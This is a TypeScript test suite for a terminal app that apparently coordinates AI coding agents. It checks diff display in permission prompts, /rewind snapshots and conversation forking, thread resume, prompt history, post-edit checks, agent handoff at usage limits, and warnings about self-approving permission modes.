import { test, expect } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, readFileSync, realpathSync, rmSync, readdirSync, lstatSync, statSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createTestRenderer } from "@opentui/core/testing";
import { AgentSideConnection, ndJsonStream, type Agent } from "@agentclientprotocol/sdk";

// Diffs in permission prompts, /rewind, saved prompt history with Ctrl+R, and checks after edits.
process.env.CODEMAX_HOME = mkdtempSync(join(tmpdir(), "codemax-workflow-home-"));
const { ChatApp, selfApprovingMode } = await import("../src/chat/app.ts");
const { AcpEngine, inputDiff } = await import("../src/engines/acp.ts");
const { changeDiff } = await import("../src/engines/codex.ts");
const { Ledger } = await import("../src/core/ledger.ts");
const { DEFAULT_CONFIG } = await import("../src/config.ts");
const { verifyCandidates } = await import("../src/core/verify.ts");
const { loadHistory } = await import("../src/core/history.ts");

type Ctx = { conn: AgentSideConnection; sessionId: string; say: (t: string) => Promise<void>; agent?: string; cwd?: string };
/** Models a fake agent reports, and the session/set_model calls it got. */
type ModelOpts = { list: { modelId: string; name: string }[]; set: { agent: string; modelId: string }[] };
type Handler = (text: string, ctx: Ctx) => Promise<void>;
/** A fake that forks like the Claude adapter: `session/fork` at `_meta.jetbrains.air.fork.messageId`. */
type ForkLog = { forks: { from: string; messageId?: string; to: string }[]; created: string[]; promptedIn: string[]; fail?: boolean };

function fakeStream(handler: Handler, fork?: ForkLog, models?: ModelOpts, agent = "claude") {
  const a2c = new TransformStream<Uint8Array, Uint8Array>();
  const c2a = new TransformStream<Uint8Array, Uint8Array>();
  let n = 0, msg = 0, cwd = "";
  new AgentSideConnection((conn): Agent => ({
    async initialize() { return { protocolVersion: 1, agentInfo: { name: "fake", title: "Fake", version: "1" }, agentCapabilities: { loadSession: true, ...(fork ? { sessionCapabilities: { fork: {} } } : {}) }, authMethods: [] } as any; },
    async newSession(p: any) { cwd = p?.cwd ?? ""; const sessionId = `s-${++n}-${Math.random().toString(36).slice(2, 6)}`; fork?.created.push(sessionId); return { sessionId, ...(models ? { models: { currentModelId: models.list[0]!.modelId, availableModels: models.list } } : {}) } as any; },
    async extMethod(method: string, params: any) { if (method === "session/set_model") models?.set.push({ agent, modelId: params.modelId }); return {}; },
    async unstable_forkSession(p: any) { if (fork?.fail) throw new Error("fork unavailable"); const to = `f-${++n}`; fork?.forks.push({ from: p.sessionId, messageId: p._meta?.jetbrains?.air?.fork?.messageId, to }); return { sessionId: to } as any; },
    async loadSession() { return {} as any; },
    async authenticate() { return {}; },
    async prompt({ sessionId, prompt }) {
      const text = (prompt[0] as any).text as string;
      fork?.promptedIn.push(sessionId);
      const messageId = `m-${++msg}`;
      const say = (t: string) => conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", messageId, content: { type: "text", text: t } } as any });
      await handler(text, { conn, sessionId, say, cwd });
      return { stopReason: "end_turn" } as any;
    },
    async cancel() {},
  }), ndJsonStream(a2c.writable, c2a.readable));
  return ndJsonStream(c2a.writable, a2c.readable);
}

function newRepo() {
  const repo = mkdtempSync(join(tmpdir(), "codemax-wf-repo-"));
  Bun.spawnSync(["sh", "-c", "git init -q && echo original > README.md && git add -A && git -c user.email=a@b -c user.name=t commit -qm init"], { cwd: repo });
  return repo;
}

async function harness(handler: Handler, o: { cfg?: any; repo?: string; height?: number; fork?: ForkLog; resume?: boolean; thread?: string; pickThread?: boolean; onboard?: boolean; models?: ModelOpts; prep?: (app: any) => void; agent?: string } = {}) {
  const setup = await createTestRenderer({ width: 110, height: o.height ?? 30 });
  const repo = o.repo ?? newRepo();
  const ledger = new Ledger(repo, undefined, o.thread);
  const app = new ChatApp(setup.renderer, { ...structuredClone(DEFAULT_CONFIG), order: ["claude"], summarizeOnSwitch: false, priceUpdates: false, narrate: false, ...(o.cfg ?? {}) }, ledger, repo);
  const prompts: string[] = [];
  app.checkBlockers = () => [];
  app.engineFactory = (agent) => new AcpEngine({ agent, name: agent, cmd: [], forkAtMessage: !!o.fork, stream: fakeStream(async (text, ctx) => { prompts.push(text); return handler(text, { ...ctx, agent }); }, o.fork, o.models, agent) });
  (app as any).refreshDetect = async () => void (app as any).detect.set("claude", { installed: true, version: "t", engine: true });
  const frame = async (pred: (f: string) => boolean, ms = 8000) => {
    const t0 = Date.now(); let f = "";
    while (Date.now() - t0 < ms) { await setup.renderOnce(); f = setup.captureCharFrame(); if (pred(f)) return f; await Bun.sleep(30); }
    throw new Error(`timeout; last frame:\n${f}`);
  };
  const send = async (t: string) => { await setup.mockInput.typeText(t); setup.mockInput.pressEnter(); };
  const cleanup = async () => { await app.quit(); setup.renderer.destroy(); };
  o.prep?.(app);
  if (o.agent) (app as any).refreshDetect = async () => void (app as any).detect.set(o.agent, { installed: true, version: "t", engine: true });
  void app.start((o.agent ?? "claude") as any, !o.resume && !o.pickThread, { pickThread: o.pickThread, onboard: o.onboard });
  await frame((f) => f.includes(o.onboard ? "Welcome to codemax" : o.pickThread ? "Resume thread" : o.resume ? "resumed" : "new session"));
  return { setup, app, repo, ledger, prompts, frame, send, cleanup };
}

const opts = [{ optionId: "allow", name: "Allow", kind: "allow_once" }, { optionId: "reject", name: "Reject", kind: "reject_once" }];

test("permission prompts show the edit as a diff; ctrl+o shows more of a long one", async () => {
  const answers: string[] = [];
  const h = await harness(async (text, ctx) => {
    const long = Array.from({ length: 40 }, (_, i) => `line ${i}`).join("\n");
    const content = text === "short"
      ? [{ type: "diff", path: "README.md", oldText: "original\n", newText: "changed\n" }]
      : [{ type: "diff", path: "big.txt", oldText: null, newText: long }];
    const r: any = await ctx.conn.requestPermission({ sessionId: ctx.sessionId, toolCall: { toolCallId: `p-${text}`, title: "Edit README.md", kind: "edit", rawInput: { file_path: "README.md", old_string: "original", new_string: "changed" }, content }, options: opts } as any);
    answers.push(r.outcome.optionId);
    await ctx.say("ok");
  });
  try {
    await h.send("short");
    let f = await h.frame((f) => f.includes("Do you want to proceed?"));
    // Read like Claude Code's: what happened to the file, then numbered lines.
    expect(f).toContain("Added 1 line, removed 1 line"); // Claude Code's wording; the header names the file
    expect(f).toContain("1 - original");
    expect(f).toContain("1 + changed");
    expect(f).not.toContain("@@");
    expect(f).not.toContain("old_string:"); // the diff replaces the raw input dump
    h.setup.mockInput.pressKey("1");
    await h.frame((f) => f.includes("ok"));
    await h.send("long");
    f = await h.frame((f) => f.includes("Do you want to proceed?"));
    expect(f).toContain("Added 40 lines");
    expect(f).toMatch(/ 1 \+ line 0/);
    expect(f).toContain("more lines · ctrl+o to see more");
    expect(f).not.toContain("+ line 20");
    h.setup.mockInput.pressKey("o", { ctrl: true });
    f = await h.frame((f) => f.includes("+ line 13") && f.includes("PgUp/PgDn"));
    h.setup.mockInput.pressKey("\x1b[6~"); // PgDn
    await h.frame((f) => f.includes("lines above"));
    for (const [w, ht] of [[24, 10], [140, 45], [40, 12]] as const) {
      h.setup.resize(w, ht);
      await h.setup.renderOnce();
    }
    h.setup.resize(110, 30);
    expect((h.app as any).uiErrors).toBe(0);
    h.setup.mockInput.pressKey("2");
    await h.frame(() => answers.length === 2);
    expect(answers).toEqual(["allow", "reject"]);
  } finally { await h.cleanup(); }
}, 30000);

test("diffs are rebuilt from edit input when the agent sends none; Codex changes become diffs", () => {
  const repo = newRepo();
  writeFileSync(join(repo, "a.ts"), "one\ntwo\nthree\n");
  const d = inputDiff({ file_path: join(repo, "a.ts"), old_string: "two", new_string: "TWO" }, repo)!;
  expect(d).toContain("--- a.ts");
  expect(d).toContain("@@ line 2 @@");
  expect(d).toContain("-two");
  expect(d).toContain("+TWO");
  expect(inputDiff({ filePath: "new.ts", content: "hello" }, repo)).toContain("+hello");
  expect(inputDiff({ command: "ls" }, repo)).toBeUndefined();
  expect(changeDiff({ path: "x.ts", kind: { type: "update" }, diff: "@@ -1 +1 @@\n-a\n+b" })).toBe("--- x.ts\n+++ x.ts\n@@ -1 +1 @@\n-a\n+b");
  expect(changeDiff({ path: "n.ts", kind: { type: "add" }, diff: "hi\n" })).toBe("--- /dev/null\n+++ n.ts\n+hi");
});

test("/rewind (Esc twice) puts the files back to before an earlier message and the message in the prompt; /undo reverses it", async () => {
  const h = await harness(async (text, ctx) => {
    if (text.startsWith("first")) writeFileSync(join(h.repo, "README.md"), "edited by first\n");
    if (text.startsWith("second")) writeFileSync(join(h.repo, "new.txt"), "created by second\n");
    await ctx.say(`did ${text.split(" ")[0]}`);
  });
  try {
    await h.send("first change");
    await h.frame((f) => f.includes("did first"));
    await h.send("second change");
    await h.frame((f) => f.includes("did second"));
    h.setup.mockInput.pressEscape();
    await Bun.sleep(120);
    h.setup.mockInput.pressEscape();
    let f = await h.frame((f) => f.includes("Rewind the files to before which message?"));
    expect(f).toContain("first change");
    expect(f).toContain("second change");
    expect(f).toMatch(/2 files changed since/);
    await h.setup.mockInput.typeText("first");
    await h.frame((f) => !/second change\s+[A-Z][a-z]{2} \d/.test(f) && /first change\s+[A-Z][a-z]{2} \d/.test(f));
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("Restore files and edit the message"));
    h.setup.mockInput.pressEnter();
    f = await h.frame((f) => f.includes("rewound the files to before"));
    expect(readFileSync(join(h.repo, "README.md"), "utf8")).toBe("original\n");
    expect(existsSync(join(h.repo, "new.txt"))).toBe(false);
    expect((h.app as any).input.plainText).toBe("first change");
    // The agent is told with the next message.
    (h.app as any).input.clear();
    await h.send("/undo");
    await h.frame((f) => f.includes("reverted to the snapshot before rewind"));
    expect(readFileSync(join(h.repo, "README.md"), "utf8")).toBe("edited by first\n");
    expect(existsSync(join(h.repo, "new.txt"))).toBe(true);
    await h.send("go on");
    await h.frame(() => h.prompts.length === 3);
    expect(h.prompts[2]).toContain("The user rewound the working tree");
  } finally { await h.cleanup(); }
}, 30000);

test("/rewind cuts a forking agent's conversation too: it is not told, and the journal drops the undone turns", async () => {
  const log: ForkLog = { forks: [], created: [], promptedIn: [] };
  const h = await harness(async (text, ctx) => {
    if (text.startsWith("first")) writeFileSync(join(h.repo, "README.md"), "edited by first\n");
    if (text.startsWith("second")) writeFileSync(join(h.repo, "new.txt"), "created by second\n");
    await ctx.say(`did ${text.split(" ")[0]}`);
  }, { fork: log });
  const rewind = async (filter: string) => {
    h.setup.mockInput.pressEscape();
    await Bun.sleep(120);
    h.setup.mockInput.pressEscape();
    await h.frame((f) => f.includes("Rewind the files to before which message?"));
    await h.setup.mockInput.typeText(filter);
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    const f = await h.frame((f) => f.includes("Restore files only"));
    h.setup.mockInput.pressArrow("down");
    h.setup.mockInput.pressEnter();
    return f;
  };
  try {
    await h.send("first change");
    await h.frame((f) => f.includes("did first"));
    await h.send("second change");
    await h.frame((f) => f.includes("did second"));
    const first = log.created[0]!;
    const f = await rewind("second");
    expect(f).toContain("files and Claude Code's conversation");
    await h.frame((f) => f.includes("no longer remembers the later turns") && f.includes("rewound the files to before"));
    // Forked at the reply before "second change" (m-1), not at its own reply.
    expect(log.forks).toEqual([{ from: first, messageId: "m-1", to: expect.any(String) }]);
    expect(existsSync(join(h.repo, "new.txt"))).toBe(false);
    expect(readFileSync(join(h.repo, "README.md"), "utf8")).toBe("edited by first\n");
    const users = () => h.ledger.journal.steps().filter((s: any) => s.kind === "user").map((s: any) => s.text);
    expect(users()).toEqual(["first change"]);
    expect(h.ledger.journal.steps().some((s: any) => s.kind === "rewind")).toBe(true);
    await h.send("third change");
    await h.frame(() => h.prompts.length === 3);
    expect(h.prompts[2]).not.toContain("rewound");
    expect(log.promptedIn[2]).toBe(log.forks[0]!.to);
    expect(users()).toEqual(["first change", "third change"]);
    // Before the first message there is nothing to keep: a new, empty session.
    await h.frame((f) => f.includes("did third"));
    await rewind("first");
    await h.frame((f) => f.includes('back to before "first change"') && f.includes('rewound the files to before "first change"'));
    expect(log.created.length).toBe(2);
    expect(log.forks.length).toBe(1);
    expect(readFileSync(join(h.repo, "README.md"), "utf8")).toBe("original\n");
    expect(users()).toEqual([]);
  } finally { await h.cleanup(); }
}, 30000);

test("/rewind after a restart still cuts the conversation: snapshots keep where it stood", async () => {
  const log: ForkLog = { forks: [], created: [], promptedIn: [] };
  const handler: Handler = async (text, ctx) => {
    if (text.startsWith("second")) writeFileSync(join(repo, "new.txt"), "x\n");
    await ctx.say(`did ${text.split(" ")[0]}`);
  };
  const repo = newRepo();
  let h = await harness(handler, { fork: log, repo });
  try {
    await h.send("first change");
    await h.frame((f) => f.includes("did first"));
    await h.send("second change");
    await h.frame((f) => f.includes("did second"));
  } finally { await h.cleanup(); }
  const first = log.created[0]!;
  h = await harness(handler, { fork: log, repo, resume: true });
  try {
    await h.send("/rewind");
    await h.frame((f) => f.includes("Rewind the files to before which message?"));
    await h.setup.mockInput.typeText("second");
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    const f = await h.frame((f) => f.includes("Restore files only"));
    expect(f).toContain("files and Claude Code's conversation");
    h.setup.mockInput.pressArrow("down");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("no longer remembers the later turns") && f.includes("rewound the files to before"));
    expect(log.forks).toEqual([{ from: first, messageId: "m-1", to: expect.any(String) }]);
    expect(existsSync(join(repo, "new.txt"))).toBe(false);
  } finally { await h.cleanup(); }
}, 30000);

test("snapshots are byte-exact: no line-ending conversion from autocrlf or .gitattributes (Windows)", async () => {
  const { createCheckpoint, restoreCheckpoint } = await import("../src/core/checkpoint.ts");
  const repo = newRepo();
  Bun.spawnSync(["git", "config", "core.autocrlf", "true"], { cwd: repo });
  writeFileSync(join(repo, ".gitattributes"), "* text eol=crlf\n");
  writeFileSync(join(repo, "lf.txt"), "one\ntwo\n");
  writeFileSync(join(repo, "crlf.txt"), "one\r\ntwo\r\n");
  const cp = (await createCheckpoint(repo, "before test: eol"))!;
  writeFileSync(join(repo, "lf.txt"), "changed\n");
  writeFileSync(join(repo, "crlf.txt"), "changed\r\n");
  await restoreCheckpoint(repo, cp.sha);
  expect(readFileSync(join(repo, "lf.txt"), "utf8")).toBe("one\ntwo\n");
  expect(readFileSync(join(repo, "crlf.txt"), "utf8")).toBe("one\r\ntwo\r\n");
});

test("threads: --resume picks one of this folder's conversations; each keeps its own history, sessions and snapshots", async () => {
  const repo = newRepo();
  const say = async (text: string, ctx: Ctx) => { writeFileSync(join(repo, `${text.split(" ")[0]}.txt`), "x\n"); await ctx.say(`did ${text}`); };
  let h = await harness(say, { repo });
  let alpha = "";
  try {
    await h.send("alpha task");
    await h.frame((f) => f.includes("did alpha task"));
    alpha = h.app.threadId;
  } finally { await h.cleanup(); }
  h = await harness(say, { repo, thread: "new" });
  let beta = "";
  try {
    await h.send("beta task");
    await h.frame((f) => f.includes("did beta task"));
    beta = h.app.threadId;
    expect(beta).not.toBe(alpha);
  } finally { await h.cleanup(); }
  h = await harness(say, { repo, pickThread: true });
  try {
    let f = h.setup.captureCharFrame();
    expect(f).toContain("alpha task");
    expect(f).toContain("beta task");
    expect(f).toContain(alpha);
    // Claude Code's resume screen: the whole screen, two lines per thread, newest first.
    expect(f).toContain("Resume thread (1 of 2)");
    expect(f).toMatch(/just now · Claude Code · 1 message · /);
    expect(f.indexOf("beta task")).toBeLessThan(f.indexOf("alpha task"));
    expect(f).not.toContain("? for shortcuts"); // the chat is hidden behind it
    // Space previews the selected thread's messages.
    await h.setup.mockInput.typeText(" ");
    f = await h.frame((f) => f.includes("did beta task"));
    expect(f).toContain("Space or Esc back to the list");
    h.setup.mockInput.pressEscape();
    await h.frame((f) => f.includes("Space preview")); // back on the list (Esc then a letter reads as alt+letter)
    await h.setup.mockInput.typeText("alpha");
    f = await h.frame((f) => f.includes("⌕ alpha"));
    expect(f).not.toContain("beta task");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("resumed"));
    expect(h.app.threadId).toBe(alpha);
    expect((h.app as any).ledger.journal.steps().filter((x: any) => x.kind === "user").map((x: any) => x.text)).toEqual(["alpha task"]);
    // Rewind offers this thread's messages only.
    h.setup.mockInput.pressEscape();
    await Bun.sleep(120);
    h.setup.mockInput.pressEscape();
    f = await h.frame((f) => f.includes("Rewind the files to before which message?"));
    expect(f).toContain("alpha task");
    expect(f).not.toContain("beta task");
  } finally { await h.cleanup(); }
}, 40000);

test("/rewind falls back to telling the agent when its conversation cannot be forked", async () => {
  const log: ForkLog = { forks: [], created: [], promptedIn: [], fail: true };
  const h = await harness(async (text, ctx) => {
    if (text.startsWith("second")) writeFileSync(join(h.repo, "new.txt"), "x\n");
    await ctx.say(`did ${text.split(" ")[0]}`);
  }, { fork: log });
  try {
    await h.send("first change");
    await h.frame((f) => f.includes("did first"));
    await h.send("second change");
    await h.frame((f) => f.includes("did second"));
    await h.send("/rewind");
    await h.frame((f) => f.includes("Rewind the files to before which message?"));
    await h.setup.mockInput.typeText("second");
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("Restore files only"));
    h.setup.mockInput.pressArrow("down");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("could not rewind") && f.includes("rewound the files to before"));
    expect(existsSync(join(h.repo, "new.txt"))).toBe(false);
    await h.send("go on");
    await h.frame(() => h.prompts.length === 3);
    expect(h.prompts[2]).toContain("The user rewound the working tree");
    expect(log.promptedIn[2]).toBe(log.created[0]);
  } finally { await h.cleanup(); }
}, 30000);

test("prompt history survives a restart: ↑ recalls it and Ctrl+R searches it", async () => {
  const repo = newRepo();
  let h = await harness(async (_t, ctx) => ctx.say("noted"), { repo });
  try {
    await h.send("remember the parser bug");
    await h.frame((f) => f.includes("noted"));
    await h.send("unrelated message");
    await h.frame(() => h.prompts.length === 2);
  } finally { await h.cleanup(); }
  expect(loadHistory(repo)).toEqual(["remember the parser bug", "unrelated message"]);
  expect(loadHistory("/some/other/project")).toEqual([]);
  h = await harness(async (_t, ctx) => ctx.say("noted"), { repo });
  try {
    h.setup.mockInput.pressArrow("up");
    await h.frame(() => (h.app as any).input.plainText === "unrelated message");
    (h.app as any).input.clear();
    h.setup.mockInput.pressKey("r", { ctrl: true });
    await h.frame((f) => f.includes("Search your messages"));
    await h.setup.mockInput.typeText("parser");
    await h.frame((f) => !f.includes("unrelated message"));
    h.setup.mockInput.pressEnter();
    await h.frame(() => (h.app as any).input.plainText === "remember the parser bug");
  } finally { await h.cleanup(); }
}, 30000);

test("checks after edits: a failure goes back to the agent (fix mode), it fixes it, the checks pass", async () => {
  const repo = newRepo();
  // Runs the same under sh and cmd.exe (Windows).
  const cmd = `bun -e "if (!require('fs').existsSync('ok.txt')) { console.log('CHECK-FAILED-MARK'); process.exit(3) }"`;
  const h = await harness(async (text, ctx) => {
    if (text.startsWith("[codemax checks]")) writeFileSync(join(repo, "ok.txt"), "fixed\n");
    else if (text.startsWith("edit")) writeFileSync(join(repo, "work.txt"), "work\n");
    await ctx.say("turn done");
  }, { repo, cfg: { verify: { [repo]: cmd }, verifyOnFail: "fix" } });
  try {
    await h.send("just a question");
    await h.frame((f) => f.includes("turn done"));
    await Bun.sleep(300);
    expect(h.setup.captureCharFrame()).not.toContain("Checks ·"); // nothing changed: no checks
    await h.send("edit the file");
    let f = await h.frame((f) => f.includes("passed in"));
    expect(h.prompts.length).toBe(3);
    expect(h.prompts[2]).toContain("CHECK-FAILED-MARK");
    expect(h.prompts[2]).toContain("exit 3");
    expect(f).toContain("fix the failing checks");
    expect(f).toContain("sending the failure to Claude Code to fix (1/2");
  } finally { await h.cleanup(); }
}, 30000);

test("checks after edits: show mode attaches the failure to your next message; fix mode stops after 2 tries", async () => {
  const repo = newRepo();
  const h = await harness(async (_text, ctx) => {
    writeFileSync(join(repo, `w-${Math.random()}.txt`), "x");
    await ctx.say("turn done");
  }, { repo, cfg: { verify: { [repo]: "echo NOPE-MARK && exit 1" }, verifyOnFail: "show" } });
  try {
    await h.send("edit once");
    await h.frame((f) => f.includes("failed (exit 1)") && f.includes("goes with your next message"));
    expect(h.prompts.length).toBe(1);
    (h.app as any).config.verifyOnFail = "fix";
    await h.send("edit again");
    await h.frame((f) => f.includes("not sent automatically again"), 15000);
    // edit again (+ the earlier failure) → fix 1 → fix 2 → stop
    expect(h.prompts.length).toBe(4);
    expect(h.prompts[1]).toContain("NOPE-MARK");
    expect(h.prompts[1]!.startsWith("edit again")).toBe(true);
    expect(h.prompts.slice(2).every((p) => p.startsWith("[codemax checks]"))).toBe(true);
  } finally { await h.cleanup(); }
}, 40000);

test("check commands are found from the project's own files", () => {
  const repo = newRepo();
  writeFileSync(join(repo, "package.json"), JSON.stringify({ scripts: { test: "bun test", typecheck: "tsc --noEmit" } }));
  writeFileSync(join(repo, "bun.lock"), "");
  expect(verifyCandidates(repo)).toEqual(["bun run typecheck && bun run test", "bun run test", "bun run typecheck"]);
  const npm = newRepo();
  writeFileSync(join(npm, "package.json"), JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } }));
  writeFileSync(join(npm, "go.mod"), "module x");
  expect(verifyCandidates(npm)).toEqual(["go test ./...", "go vet ./..."]);
});

test("starting in a mode where the agent approves itself (your Claude settings' auto) is pointed out", () => {
  const claude = [{ id: "default", name: "Default" }, { id: "acceptEdits", name: "Accept Edits" }, { id: "auto", name: "Auto" }, { id: "bypassPermissions", name: "Bypass Permissions" }];
  expect(selfApprovingMode("auto", claude)).toEqual({ what: '"Auto"', effect: "it acts without asking", ask: "default" });
  expect(selfApprovingMode("acceptEdits", claude)?.effect).toBe("it edits files without asking");
  expect(selfApprovingMode("yolo", [{ id: "default", name: "Default" }, { id: "yolo", name: "YOLO" }])?.what).toBe('"YOLO"');
  expect(selfApprovingMode("default", claude)).toBeNull();
  expect(selfApprovingMode("plan", claude)).toBeNull();
  expect(selfApprovingMode("on-request", [])).toBeNull();
  expect(selfApprovingMode(undefined, claude)).toBeNull();
});

test("first-run setup: every setting one by one with arrows and Enter; answers apply at once; Esc keeps the defaults", async () => {
  const { CONFIG_PATH } = await import("../src/config.ts");
  const h = await harness(async (_t, ctx) => ctx.say("hi"), { onboard: true, height: 34 });
  const header = (f: string) => Number(f.match(/setup \d+ of (\d+)/)?.[1]);
  try {
    let f = h.setup.captureCharFrame();
    expect(f).toContain("setup 1 of");
    // Enter keeps each current answer; walk to the theme.
    const step = (f: string) => Number(f.match(/setup (\d+) of/)?.[1]);
    for (let i = 0; i < 10 && !f.includes("Auto reads your terminal's background"); i++) {
      h.setup.mockInput.pressEnter();
      const was = step(f);
      f = await h.frame((g) => step(g) > was);
    }
    expect(f).toContain("Theme");
    expect(f).toMatch(/❯ auto\s+\(now\)/);
    const themeAt = step(f);
    const total = header(f);
    h.setup.mockInput.pressArrow("down"); // dark
    h.setup.mockInput.pressEnter();
    f = await h.frame((f) => step(f) === themeAt + 1);
    expect((h.app as any).config.theme).toBe("dark");
    expect(JSON.parse(readFileSync(CONFIG_PATH, "utf8")).theme).toBe("dark");
    // ← goes back: the theme shows its new value.
    h.setup.mockInput.pressArrow("left");
    f = await h.frame((f) => step(f) === themeAt);
    expect(f).toMatch(/dark\s+\(now\)/);
    h.setup.mockInput.pressEnter();
    // Walk to the side agent; choosing one adds its follow-up questions.
    for (let i = 0; i < 20; i++) {
      f = await h.frame(() => true);
      if (/Side agent\s*$/m.test(f) || f.includes("A second agent that reads")) break;
      h.setup.mockInput.pressEnter();
      await Bun.sleep(40);
    }
    expect(f).toContain("A second agent that reads");
    const before = header(f);
    expect(before).toBe(total);
    h.setup.mockInput.pressArrow("down"); // Claude Code
    h.setup.mockInput.pressEnter();
    f = await h.frame((f) => header(f) > before);
    expect((h.app as any).config.sideAgent.agent).toBe("claude");
    // Esc: the rest keep their defaults, setup is recorded, and the agent starts.
    h.setup.mockInput.pressEscape();
    f = await h.frame((f) => f.includes("setup skipped") && f.includes("new session"));
    expect(f).not.toContain("Welcome to codemax");
    expect(JSON.parse(readFileSync(CONFIG_PATH, "utf8")).onboarded).toBe(true);
  } finally { await h.cleanup(); }
}, 30000);

test("an existing user who updates sees setup once, then lands back in the thread they were in", async () => {
  const repo = newRepo();
  let h = await harness(async (_t, ctx) => ctx.say("noted"), { repo });
  let thread = "";
  try {
    await h.send("keep working on the parser");
    await h.frame((f) => f.includes("noted"));
    thread = h.app.threadId;
  } finally { await h.cleanup(); }
  h = await harness(async (_t, ctx) => ctx.say("noted"), { repo, resume: true, onboard: true });
  try {
    h.setup.mockInput.pressEnter(); // keep the first answer
    await h.frame((f) => f.includes("setup 2 of"));
    h.setup.mockInput.pressEscape();
    const f = await h.frame((f) => f.includes("resumed"));
    expect(f).toContain("setup skipped");
    expect(h.app.threadId).toBe(thread);
  } finally { await h.cleanup(); }
}, 30000);

test("handoff order: agents and models first to last; at a limit the next one takes over on its model, automatically if you like", async () => {
  const models: ModelOpts = { list: [{ modelId: "big-5-5", name: "Big 5.5" }, { modelId: "small-4", name: "Small 4" }], set: [] };
  const h = await harness(async (text, ctx) => {
    if (ctx.agent === "claude" && text.startsWith("work")) throw new Error("You've hit your usage limit · resets 3pm");
    await ctx.say(`${ctx.agent} did it`);
  }, { models, height: 34 });
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  const pick = async (filter: string, until: string) => {
    await h.setup.mockInput.typeText(filter);
    await Bun.sleep(60);
    h.setup.mockInput.pressEnter();
    return h.frame((f) => f.includes(until));
  };
  try {
    await h.send("/config");
    await h.frame((f) => f.includes("At a usage limit")); // the list is open (it scrolls past 30 rows)
    await pick("handoff order", "Edit the order");
    h.setup.mockInput.pressEnter();
    let f = await h.frame((f) => f.includes("Handoff order · when one agent hits its limit"));
    expect(f).toContain("1. Claude Code");
    // Add Codex on Small 4, from the agent's own model list.
    await pick("add", "Add which agent?");
    await pick("codex", "Model on Codex");
    f = await pick("small", "2. Codex · Small 4");
    // An entry can be moved: Codex up to first, then back down.
    await pick("2.", "Move up");
    await pick("move up", "1. Codex · Small 4");
    await pick("1.", "Move down");
    await pick("move down", "2. Codex · Small 4");
    h.setup.mockInput.pressEscape(); // done: back in /config
    // Back in /config with the order saved (the confirmation line can sit under the open list).
    await h.frame((f) => f.includes("Settings ·") && (h.app as any).config.handoffChain?.length === 2);
    await Bun.sleep(120);
    h.setup.mockInput.pressEscape();
    await h.frame((f) => !f.includes("Settings ·"));
    expect((h.app as any).config.handoffChain).toEqual([{ agent: "claude" }, { agent: "codex", model: "small-4", modelName: "Small 4" }]);
    // Automatic handoff.
    await h.send("/config");
    await pick("at a usage limit", "hand off automatically");
    await pick("automatically", "Settings ·");
    await Bun.sleep(120);
    h.setup.mockInput.pressEscape();
    await h.frame((f) => !f.includes("Settings ·"));
    expect((h.app as any).config.autoHandoff).toBe(true);
    await Bun.sleep(100);
    // Claude hits its limit: Codex takes over the task on Small 4, without asking.
    await h.send("work on the parser");
    f = await h.frame((f) => f.includes("codex did it"), 15000);
    expect(f).toContain("handing off to Codex · Small 4 (next in your handoff order)");
    expect(f).toMatch(/Codex[^\n]*Small 4 · new session/); // the session rule names the model that answers
    expect(models.set).toContainEqual({ agent: "codex", modelId: "small-4" });
    expect(h.prompts.at(-1)).toContain("work on the parser");
  } finally { await h.cleanup(); }
}, 40000);

test("an agent that refuses every turn (its MCP server fails to start) is no answer: the task goes to the next agent", async () => {
  const { agentSetupFailure } = await import("../src/engines/errors.ts");
  const refusal = "The MCP server 'data-agent-kit' failed to initialize: [MCP Proxy] Socket connection error: connect ENOENT /tmp/datacloud-mcp-dataAgentKit-antigravityide.sock: connection closed: calling \"initialize\": client is closing: EOF. Fix the MCP server, or remove it from your configuration and start a new session, to continue.";
  expect(agentSetupFailure(refusal)).toMatchObject({ mcpServer: "data-agent-kit" });
  expect(agentSetupFailure("I fixed the MCP server config for you.")).toBeNull();
  const h = await harness(async (_text, ctx) => (ctx.agent === "claude" ? ctx.say(refusal) : ctx.say(`${ctx.agent} did it`)), { cfg: { autoHandoff: true } });
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  (h.app as any).config.order = ["claude", "codex"];
  try {
    await h.send("build the parser");
    const f = await h.frame((f) => f.includes("codex did it"), 15000);
    expect(f).toContain('won\'t work until its MCP server "data-agent-kit" starts');
    expect(f).toContain("handing off to Codex");
    // The request reached Codex unanswered; the refusal was not saved as Claude's answer.
    expect(h.prompts.at(-1)).toContain("build the parser");
    expect(h.ledger.turns().some((t: any) => t.role === "assistant" && t.text.includes("failed to initialize"))).toBe(false);
  } finally { await h.cleanup(); }
}, 30000);

test("a custom command written for Claude Code runs in another agent: codemax sends its prompt with the arguments filled in", async () => {
  const d = await import("../src/core/debuglog.ts");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  const repo = newRepo();
  mkdirSync(join(repo, ".claude", "commands"), { recursive: true });
  writeFileSync(join(repo, ".claude", "commands", "review.md"), "---\ndescription: Review a change\n---\nREVIEW-PROMPT for $ARGUMENTS, strictly.");
  const h = await harness(async (text, ctx) => ctx.say(`got ${text.length} chars`), { repo, agent: "codex", cfg: { order: ["codex"] } });
  try {
    await h.setup.mockInput.typeText("/rev");
    const f = await h.frame((f) => f.includes("/review") && f.includes("Review a change"));
    expect(f).toContain("claude's command");
    for (let i = 0; i < 4; i++) h.setup.mockInput.pressBackspace();
    await h.send("/review the parser");
    await h.frame((f) => f.includes("got "));
    expect(h.prompts.at(-1)).toContain("REVIEW-PROMPT for the parser, strictly.");
    expect(await h.frame((f) => f.includes("❯ /review the parser"))).not.toContain("REVIEW-PROMPT");   // you see what you typed
    const log = readFileSync(d.debugLogPath(), "utf8");
    expect(log).toContain('"kind":"shared-command"');
    expect(log).not.toContain("REVIEW-PROMPT");
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 30000);

